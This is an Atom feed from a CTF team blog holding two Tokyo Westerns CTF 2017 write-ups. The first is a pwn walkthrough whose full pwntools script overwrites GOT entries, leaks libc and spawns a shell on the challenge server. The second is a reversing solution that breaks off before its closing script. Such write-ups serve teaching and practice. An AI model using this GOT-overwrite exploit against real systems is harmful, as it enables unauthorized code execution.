<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TEAMROCKETIST</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://teamrocketist.github.io/"/>
  <updated>2017-09-07T04:49:45.470Z</updated>
  <id>https://teamrocketist.github.io/</id>
  
  <author>
    <name>TEAMROCKETIST</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[Pwn] Tokyo Westerns CTF 3rd 2017 - Swap</title>
    <link href="https://teamrocketist.github.io/2017/09/07/Pwn-Tokyo-Westerns-CTF-3rd-2017-Swap/"/>
    <id>https://teamrocketist.github.io/2017/09/07/Pwn-Tokyo-Westerns-CTF-3rd-2017-Swap/</id>
    <published>2017-09-07T02:47:20.000Z</published>
    <updated>2017-09-07T04:49:45.470Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>The swapping is interesting. Let’s try!<br><br>nc pwn1.chal.ctf.westerns.tokyo 19937<br>swap<br>libc.so.6<br></blockquote>

<p>We are given an 64 bit ELF for Linux x86-64:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ file swap</div><div class="line">swap: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=74448e9fb5920898de1f9b5115c764eff1c8edac, not stripped</div></pre></td></tr></table></figure>
<p>We decompile it using ida’s pseudo c converter:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax@2</span></div><div class="line">  <span class="keyword">void</span> *src; <span class="comment">// [sp+20h] [bp-20h]@0</span></div><div class="line">  <span class="keyword">void</span> *v5; <span class="comment">// [sp+28h] [bp-18h]@0</span></div><div class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+30h] [bp-10h]@7</span></div><div class="line"></div><div class="line">  initialize();</div><div class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">  &#123;</div><div class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</div><div class="line">    &#123;</div><div class="line">      print_menu();</div><div class="line">      v3 = read_int();</div><div class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Please input 1st addr"</span>);</div><div class="line">      src = (<span class="keyword">void</span> *)read_ll();</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Please input 2nd addr"</span>);</div><div class="line">      v5 = (<span class="keyword">void</span> *)read_ll();</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ( v3 == <span class="number">2</span> )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">memcpy</span>(&amp;dest, src, <span class="number">8u</span>LL);</div><div class="line">      <span class="built_in">memcpy</span>(src, v5, <span class="number">8u</span>LL);</div><div class="line">      <span class="built_in">memcpy</span>(v5, &amp;dest, <span class="number">8u</span>LL);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( !v3 )</div><div class="line">    &#123;</div><div class="line">      <span class="built_in">puts</span>(<span class="string">"Bye."</span>);</div><div class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">__<span class="function">int64 <span class="title">read_int</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  __int64 result; <span class="comment">// rax@1</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+10h] [bp-90h]@1</span></div><div class="line"></div><div class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</div><div class="line">  result = atoi(&amp;buf);</div><div class="line"></div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div><div class="line">__<span class="function">int64 <span class="title">read_ll</span><span class="params">()</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  __int64 result; <span class="comment">// rax@1</span></div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+10h] [bp-110h]@1</span></div><div class="line"></div><div class="line"></div><div class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x20</span>uLL);</div><div class="line">  result = atoll(&amp;buf);</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Resuming what the program is actually doing:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Option 1 - Choose two addresses</div><div class="line">Option 2 - Swap 2 addresses previously chosen (can be used to switch <span class="keyword">function</span> addresses <span class="keyword">for</span> example)</div><div class="line">Option 3 - Prints <span class="built_in">bye</span> and exits</div></pre></td></tr></table></figure>
<p>The first thing we can start doing is to get the GOT(Global Offset Table) addresses of the functions we need, we can do this in 3 ways:   </p>
<ol>
<li>objdump</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ objdump -R swap</div></pre></td></tr></table></figure>
<ol>
<li>Readelf</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ readelf -r swap</div></pre></td></tr></table></figure>
<ol>
<li>pwntools</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">binary = ELF ( <span class="string">'./swap'</span> )</div><div class="line">ATOIGOT = binary.got[<span class="string">'atoi'</span>]</div><div class="line">PUTSGOT =  binary.got[<span class="string">'puts'</span>]</div><div class="line">READGOT =  binary.got[<span class="string">'read'</span>]</div><div class="line">MEMCOPYGOT = binary.got[<span class="string">'memcpy'</span>]</div></pre></td></tr></table></figure>
<p>To get the PLT addresses we can either use objdump or pwntools again</p>
<ol>
<li>objdump</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">objdump -dj.plt swap</div></pre></td></tr></table></figure>
<ol>
<li>pwntools</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">binary = ELF ( <span class="string">'./swap'</span> )</div><div class="line">PUTSPLT =  binary.plt[<span class="string">'puts'</span>]</div></pre></td></tr></table></figure>
<p>Now making a nice function to swap addresses in python : </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span><span class="params">(address1, address2)</span>:</span></div><div class="line">  <span class="keyword">print</span> r.recvuntil(<span class="string">'Your choice: \n'</span>)</div><div class="line">  send(<span class="string">'1'</span>)</div><div class="line"></div><div class="line">  <span class="keyword">print</span> r.recvuntil(<span class="string">'Please input 1st addr'</span>)</div><div class="line">  send(str(address1))</div><div class="line">  <span class="keyword">print</span> r.recvuntil(<span class="string">'Please input 2nd addr'</span>)</div><div class="line">  send(str(address2))</div><div class="line">  <span class="keyword">print</span> r.recvuntil(<span class="string">'Your choice: \n'</span>)</div><div class="line">  send(<span class="string">'2'</span>)</div></pre></td></tr></table></figure>
<p>We can start by thinking into changing <code>memcpy_got</code> and read_got addresses, and why? because with this when we choose the option 2 to swap we will have something like this:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">read(&amp;dest, address1, <span class="number">8u</span>LL);</div><div class="line">read(address1, address2, <span class="number">8u</span>LL);</div><div class="line">read(address2, &amp;dest, <span class="number">8u</span>LL);</div></pre></td></tr></table></figure>
<p>The second read is what is interesting to us, we can controll the first two arguments to our advantage, if we choose the 1st address to be the file descriptor 0(<code>STDIN</code>) and the 2nd address the function we want to overwrite.   </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">read(<span class="number">0</span>, ATOI_GOT, <span class="number">0x8</span>); <span class="comment">// example: 1st arg: 0, 2nd arg: ATOI_GOT</span></div></pre></td></tr></table></figure>
<p>The next thing to do is to overwrite <code>atoi</code> function and why we want to do it? Because if we overwrite <code>atoi</code> into <code>puts_plt</code> we can leak addresses easily, because we first read them and then print them!</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">read(<span class="number">0</span>, &amp;buf, <span class="number">0x10</span>uLL);</div><div class="line">result = <span class="built_in">puts</span>(&amp;buf);</div></pre></td></tr></table></figure>
<p>Now that we overwrite <code>atoi</code> with <code>puts</code> we can start trying to leak libc addresses like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line">r.send(<span class="string">"B"</span>)</div><div class="line">h = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) <span class="comment"># ljust will convert an address like 0x7f3253354340 into 0x0007f3253354340</span></div><div class="line"><span class="keyword">print</span> <span class="string">"STACK ADDRESS 0x%x"</span>%h</div></pre></td></tr></table></figure>
<p>Now we got a stack address but it’s still not the address we need, we have to calculate the offset of this address to the libcbase address! we can calculate this with help of gdb. Just run your python script (there will be a sleep of 5 seconds and attach the PID address on gdb like this:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">pwndbg&gt; attach 6865</div><div class="line">...outputfrompwngdb...</div><div class="line">pwndbg&gt; <span class="built_in">continue</span></div><div class="line">pwndbg&gt; p system</div><div class="line"><span class="variable">$1</span> = &#123;&lt;text variable, no debug info&gt;&#125; 0x7fcb77dea391 &lt;system&gt;</div><div class="line"></div><div class="line">---------------runing-program-in-another-terminal---------------</div><div class="line">$ python swap.py</div><div class="line">..hidden-output...</div><div class="line">1. Set addrsses</div><div class="line">2. Swap both addrress of value</div><div class="line">0. Exit</div><div class="line">Your choice: </div><div class="line"></div><div class="line">STACK ADDRESS 0x7fcb7816a642</div></pre></td></tr></table></figure>
<p>Now if we subtract the leaked address from the system address we got from gdb we will get and offset to system function:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python -c <span class="string">"print hex(0x7fcb7816a642 - 0x7fcb77dea391)"</span></div><div class="line"><span class="number">0x3802b1</span></div></pre></td></tr></table></figure>
<p>Adapting the python script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">h = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"STACK ADDRESS 0x%x"</span>%h</div><div class="line">addr = h<span class="number">-0x3802b1</span>- libc.symbols[<span class="string">'system'</span>]</div><div class="line">LIBCBASE = addr</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line"><span class="comment">#print r.recv(1024)</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div></pre></td></tr></table></figure>
<p>We still have a small problem from now on, now that we overwrite the atoi we can’t really choose which option from the menu, well we actually can! puts returns the number of bytes printed! the null byte is included in this count! </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">int i = puts(&apos;\x00&apos;) // returns 1</div><div class="line">int i = puts(&apos;B\x00&apos;) // returns 2</div></pre></td></tr></table></figure>
<p>Now we give the input ‘B\x00’ into puts so it will return the value 2! and we overwrite the atoi-&gt;puts-&gt;system and sent the “/bin/sh\x00” string to get ourselves a shell!:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">r.send(<span class="string">'a\x00'</span>) <span class="comment"># returns option 2 from puts</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line">r.send(p64(SYSTEM)) <span class="comment"># overwrites atoi -&gt; puts -&gt; system</span></div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line">r.send(<span class="string">'/bin/sh\x00'</span>) <span class="comment"># passes argument /bin/sh into system</span></div></pre></td></tr></table></figure>
<p>The full script is:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pwnlib.tubes <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pwnlib.util.packing <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pwnlib.tubes.process <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> pwnlib.tubes.remote <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="keyword">import</span> struct</div><div class="line"><span class="keyword">import</span> time</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">(local)</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'./swap'</span>, env = &#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libc.so.6"</span>&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'pwn1.chal.ctf.westerns.tokyo'</span>, <span class="number">19937</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(s)</span>:</span></div><div class="line">	<span class="keyword">print</span> s</div><div class="line">	r.sendline(s)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">swap</span><span class="params">(address1, address2)</span>:</span></div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'Your choice: \n'</span>)</div><div class="line">	send(<span class="string">'1'</span>)</div><div class="line"></div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'Please input 1st addr'</span>)</div><div class="line">	send(str(address1))</div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'Please input 2nd addr'</span>)</div><div class="line">	send(str(address2))</div><div class="line"></div><div class="line">	<span class="keyword">print</span> r.recvuntil(<span class="string">'Your choice: \n'</span>)</div><div class="line">	send(<span class="string">'2'</span>)</div><div class="line"></div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line">binary = ELF ( <span class="string">'./swap'</span> )</div><div class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</div><div class="line"></div><div class="line">PUTSPLT = binary.plt[<span class="string">'puts'</span>]</div><div class="line">ATOIGOT = binary.got[<span class="string">'atoi'</span>]</div><div class="line">PUTSGOT =  binary.got[<span class="string">'puts'</span>]</div><div class="line">READGOT =  binary.got[<span class="string">'read'</span>]</div><div class="line">MEMCOPYGOT = binary.got[<span class="string">'memcpy'</span>]</div><div class="line"></div><div class="line">r = getConn(local)</div><div class="line">swap(MEMCOPYGOT,READGOT)</div><div class="line">swap(<span class="number">0</span>,ATOIGOT)</div><div class="line">r.send(p64(PUTSPLT))</div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line"></div><div class="line">r.send(<span class="string">"B"</span>)</div><div class="line"></div><div class="line">h = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"STACK ADDRESS 0x%x"</span>%h</div><div class="line">addr = h<span class="number">-0x3802b1</span>- libc.symbols[<span class="string">'system'</span>]</div><div class="line">LIBCBASE = addr</div><div class="line">SYSTEM = LIBCBASE + libc.symbols[<span class="string">'system'</span>]</div><div class="line"><span class="comment">#print r.recv(1024)</span></div><div class="line"></div><div class="line">log.info(<span class="string">"LIBC 0x%x"</span> % LIBCBASE)</div><div class="line">log.info(<span class="string">"SYSTEM 0x%x"</span> % SYSTEM)</div><div class="line">r.send(<span class="string">'a\x00'</span>)</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line">r.send(p64(SYSTEM))</div><div class="line"></div><div class="line"><span class="keyword">print</span> r.recvuntil(<span class="string">'choice: \n'</span>)</div><div class="line">r.send(<span class="string">'/bin/sh\x00'</span>)</div><div class="line"></div><div class="line">r.interactive()</div><div class="line">r.close()</div></pre></td></tr></table></figure>
<p>Running it</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ python swap.py</div><div class="line">[*] <span class="string">'~/swap'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">[*] <span class="string">'~/libc.so.6'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    Canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      PIE enabled</div><div class="line">...hidden-output...</div><div class="line">STACK ADDRESS 0x7fe5d8827642</div><div class="line">[*] LIBC 0x7fe5d8462001</div><div class="line">[*] SYSTEM 0x7fe5d84a7391</div><div class="line">...hidden-output...</div><div class="line">$ cat flag</div><div class="line">TWCTF&#123;SWAP_SAWP_WASP_PWAS_SWPA&#125;</div></pre></td></tr></table></figure>
<p>I didn’t solve this challenge in the CTF tournament I actually read this write ups(<a href="https://ctftime.org/writeup/7387" target="_blank" rel="external">https://ctftime.org/writeup/7387</a> and <a href="https://github.com/sk4px/CTFs/blob/master/tw2017/swap.py" target="_blank" rel="external">https://github.com/sk4px/CTFs/blob/master/tw2017/swap.py</a>) and did the challenge by myself after that.</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;The swapping is interesting. Let’s try!&lt;br&gt;&lt;br&gt;nc pwn1.chal.ctf.westerns.tokyo 19937&lt;br&gt;swap&lt;br&gt;libc.so.6&lt;br&gt;&lt;/blockquote&gt;


    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="swapaddresses" scheme="https://teamrocketist.github.io/tags/swapaddresses/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Tokyo Westerns CTF 3rd 2017 - Rev Rev Rev</title>
    <link href="https://teamrocketist.github.io/2017/09/04/Reverse-Tokyo-Westerns-CTF-3rd-2017-Rev-Rev-Rev/"/>
    <id>https://teamrocketist.github.io/2017/09/04/Reverse-Tokyo-Westerns-CTF-3rd-2017-Rev-Rev-Rev/</id>
    <published>2017-09-04T01:25:49.000Z</published>
    <updated>2017-09-04T18:14:47.808Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br> Rev Rev Rev<br>Problem<br><br><a href="/content/files/tokyo-westerns-3rd-2007/rev_rev_rev">rev_rev_rev</a><br></blockquote>

<p>Lets first disassemble the main function of the binary:</p>
<p><a href="https://i.imgur.com/oe6q5SE.png" target="_blank" rel="external"> <img src="https://i.imgur.com/oe6q5SE.png" alt="main disas"> </a></p>
<p>Ignoring the <code>MK_FP</code> function which is related to the stack canaries protection on the executable we can see the program is reading from the <code>STDIN</code> into <code> s </code> and then modifies 4 modifications on the string using 4 functions:  </p>
<p><code><br>sub_80486B9(&amp;s);<br>sub_80486DB(&amp;s);<br>sub_8048738(&amp;s);<br>sub_80487B2(&amp;s);<br></code></p>
<p>Sub_80486B9 is just removing the new line in the end of the string by inserting a nullbyte on it (note that 10 or 0x0A in hex represents the \n):</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">sub_80486B9</span><span class="params">(<span class="keyword">char</span> *s)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax@1</span></div><div class="line"></div><div class="line">  result = <span class="built_in">strchr</span>(s, <span class="number">10</span>);</div><div class="line">  *result = <span class="number">0</span>;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>sub_80486DB is just reversing the string:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">sub_80486DB</span><span class="params">(<span class="keyword">char</span> *s)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> v1; <span class="comment">// ST17_1@2</span></div><div class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax@3</span></div><div class="line">  <span class="keyword">char</span> *v3; <span class="comment">// [sp+8h] [bp-10h]@1</span></div><div class="line">  <span class="keyword">char</span> *i; <span class="comment">// [sp+Ch] [bp-Ch]@1</span></div><div class="line"></div><div class="line">  v3 = s;</div><div class="line">  <span class="keyword">for</span> ( i = &amp;s[<span class="built_in">strlen</span>(s) - <span class="number">1</span>]; ; --i )</div><div class="line">  &#123;</div><div class="line">    result = v3;</div><div class="line">    <span class="keyword">if</span> ( v3 &gt;= i )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    v1 = *v3;</div><div class="line">    *v3 = *i;</div><div class="line">    *i = v1;</div><div class="line">    ++v3;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>sub_8048738 is performing a bunch of operation on the characters of the string some AND, OR and shifts</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_8048738</span><span class="params">(<span class="keyword">char</span> *a1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">char</span> v1; <span class="comment">// ST0B_1@2</span></div><div class="line">  <span class="keyword">unsigned</span> __int8 v2; <span class="comment">// ST0B_1@2</span></div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@3</span></div><div class="line">  <span class="keyword">char</span> *i; <span class="comment">// [sp+Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = a1; ; ++i )</div><div class="line">  &#123;</div><div class="line">    result = (<span class="keyword">unsigned</span> __int8)*i;</div><div class="line">    <span class="keyword">if</span> ( !(_BYTE)result )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    v1 = <span class="number">2</span> * (*i &amp; <span class="number">0x55</span>) | (*i &gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55</span>;</div><div class="line">    v2 = <span class="number">4</span> * (v1 &amp; <span class="number">0x33</span>) | (v1 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x33</span>;</div><div class="line">    *i = <span class="number">16</span> * v2 | (v2 &gt;&gt; <span class="number">4</span>);</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>sub_80487B2 is flipping the bits of each byte using ~ operator</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80487B2</span><span class="params">(_BYTE *a1)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax@3</span></div><div class="line">  _BYTE *i; <span class="comment">// [sp+Ch] [bp-4h]@1</span></div><div class="line"></div><div class="line">  <span class="keyword">for</span> ( i = a1; ; ++i )</div><div class="line">  &#123;</div><div class="line">    result = *i;</div><div class="line">    <span class="keyword">if</span> ( !(_BYTE)result )</div><div class="line">      <span class="keyword">break</span>;</div><div class="line">    *i = ~*i;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>We could rewrite this functions in python and apply it into the cipher string to get the real flag back! but thats too much work why don’t we insert the ciphertext to the binary and check if it spits the flag? lets do this with radare2:</p>
<script type="text/javascript" src="https://asciinema.org/a/Kt8Sl9ZsUHUxum9sVuFIQWEIS.js" id="asciicast-Kt8Sl9ZsUHUxum9sVuFIQWEIS" async></script>

<p>And we got the flag!!! Additionally  I did a python script that interacts with radare2 using r2pipe which is a really cool python package, this script will automate what I did manually above doing a dynamic analysis:</p>
